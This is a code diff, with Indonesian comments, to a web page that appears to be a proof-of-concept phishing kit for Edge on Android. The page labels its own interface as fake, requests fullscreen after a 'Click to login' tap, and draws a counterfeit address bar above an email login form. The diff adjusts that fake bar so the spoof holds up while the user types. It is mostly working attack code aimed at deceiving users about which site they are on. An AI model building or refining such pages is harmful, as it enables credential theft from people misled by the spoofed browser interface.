@@ -39,7 +39,7 @@
 </head>
 <body>
 
-<center style="position: fixed; z-index: 0; top: 50%; left: 50%; transform: translate(-50%, -50%);">
+<center id="start-screen" style="position: fixed; z-index: 10; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%;">
     <h1 style="font-family: sans-serif;">Click to login</h1>
 </center>
 
@@ -126,50 +126,42 @@ document.documentElement.addEventListener('click', function initApp(e) {
     document.documentElement.removeEventListener('click', initApp);
 
     // Sembunyikan tulisan "Click to login"
-    document.querySelector('center').style.display = 'none';
+    document.getElementById('start-screen').style.display = 'none';
 
     // Tampilkan UI Palsu
     document.getElementById('app-container').style.display = 'flex';
 
-    // 1. Request Fullscreen (Edge Android mendukung ini pada interaksi user)
+    // 1. Request Fullscreen
     var docEl = document.documentElement;
     if (docEl.requestFullscreen) {
         docEl.requestFullscreen().catch(err => {
             console.log("Fullscreen ditolak: ", err);
         });
     }
-
-    // 2. Auto trigger keyboard dengan delay
-    setTimeout(function () {
-        var email = document.getElementById('pocEmail');
-        if (email) {
-            email.focus(); 
-            email.click();
-            
-            // Scroll ke atas agar input tidak tertutup UI
-            document.getElementById('form-area').scrollTop = 0;
-        }
-    }, 600);
+    
+    // Auto trigger keyboard DIHAPUS.
+    // Pengguna harus mengetuk kolom input secara manual.
 });
 
-// 3. Deteksi Virtual Keyboard via visualViewport (Sangat penting untuk Edge Android)
-// Ini berfungsi agar UI form beradaptasi jika keyboard bawaan menutupi layar
+// 2. Deteksi Virtual Keyboard via visualViewport (Untuk Edge Android)
+// Agar UI (terutama address bar bawah) beradaptasi saat keyboard ditekan manual
 if (window.visualViewport) {
     const formArea = document.getElementById('form-area');
     const fakeBar = document.getElementById('fake-address-bar');
     
     window.visualViewport.addEventListener('resize', () => {
-        // Jika keyboard muncul, visualViewport.height akan mengecil
+        // Deteksi jika keyboard muncul (tinggi viewport menyusut drastis)
         const keyboardVisible = window.visualViewport.height < window.innerHeight * 0.8;
         
         if (keyboardVisible) {
-            // Jika keyboard muncul, kita bisa sembunyikan address bar palsu sementara
-            // agar form lega, atau sesuaikan padding-nya.
+            // Sembunyikan address bar palsu saat keyboard muncul
             fakeBar.style.transform = 'translateY(100%)'; 
-            formArea.style.paddingTop = '15px'; // Form naik sedikit agar pas di atas keyboard
+            // Kurangi padding agar form tidak terlalu jauh ke atas
+            formArea.style.paddingTop = '15px'; 
         } else {
+            // Kembalikan ke keadaan normal saat keyboard ditutup
             fakeBar.style.transform = 'translateY(0)';
-            formArea.style.paddingTop = '40px'; // Kembalikan padding normal
+            formArea.style.paddingTop = '40px'; 
         }
     });
 }
